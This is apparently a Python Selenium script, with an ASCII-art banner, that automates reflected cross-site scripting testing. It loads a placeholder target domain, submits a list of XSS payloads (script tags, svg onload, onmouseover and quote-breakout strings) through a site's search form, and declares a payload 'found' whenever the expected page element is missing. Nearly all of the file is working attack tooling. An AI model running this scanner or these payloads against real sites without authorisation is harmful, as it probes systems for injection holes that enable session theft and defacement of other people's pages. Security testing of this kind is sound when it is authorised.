from selenium import webdriver
import time, sys

print("""
/$$   /$$ /$$   /$$   /$$    /$$$$$$  /$$   /$$ /$$$$$$$$        /$$    /$$ /$$$$$$ /$$$$$$ /$$$$$$
| $$  /$$/| $$$ | $$ /$$$$   /$$__  $$| $$  | $$|_____ $$/      | $$   | $$|_  $$_/|_  $$_/|_  $$_/
| $$ /$$/ | $$$$| $$|_  $$  | $$  \__/| $$  | $$     /$$/       | $$   | $$  | $$    | $$    | $$  
| $$$$$/  | $$ $$ $$  | $$  | $$$$$$$ | $$$$$$$$    /$$/        |  $$ / $$/  | $$    | $$    | $$  
| $$  $$  | $$  $$$$  | $$  | $$__  $$| $$__  $$   /$$/          \  $$ $$/   | $$    | $$    | $$  
| $$\  $$ | $$\  $$$  | $$  | $$  \ $$| $$  | $$  /$$/            \  $$$/    | $$    | $$    | $$  
| $$ \  $$| $$ \  $$ /$$$$$$|  $$$$$$/| $$  | $$ /$$/              \  $/    /$$$$$$ /$$$$$$ /$$$$$$
|__/  \__/|__/  \__/|______/ \______/ |__/  |__/|__/                \_/    |______/|______/|______/
                                                                                                   
""")

browser = webdriver.Chrome(r"Folder Name/chromedriver.exe")  # you have to specify the path with driver
# browser = webdriver.Firefox(r"W:\Python Programming")
browser.get('Target domain')  # target domain

time.sleep(2)
# you have to add the payloads here | saperate with comma
payloads = ["<script>alert(document.domain)</script>",
            '"><svg onload=alert(1)//',
            "<svg onload=alert(1)  ",
            '"onmouseover=alert(1)//',
            "'-alert(1)-'",


            ]

for script in payloads:
    try:
        search = script
        # print(search)
        search_box = browser.find_element_by_xpath('//*[@id="form-search"]') # Paste xpath of the selected element
        search_box.send_keys(search)
        time.sleep(2) # you can remove this in order to fast your program
        google_search = browser.find_element_by_xpath('//*[@id="google_search"]')# Paste xpath of the selected element
        google_search.click()
        time.sleep(2)
        confirmation = browser.find_element_by_xpath('/html/body/div[2]/p')# Paste xpath of the selected element
        print(confirmation.text)
    except:
        found = script
        sys.exit(f"Found. The Payload is: {script}") # getting the payload
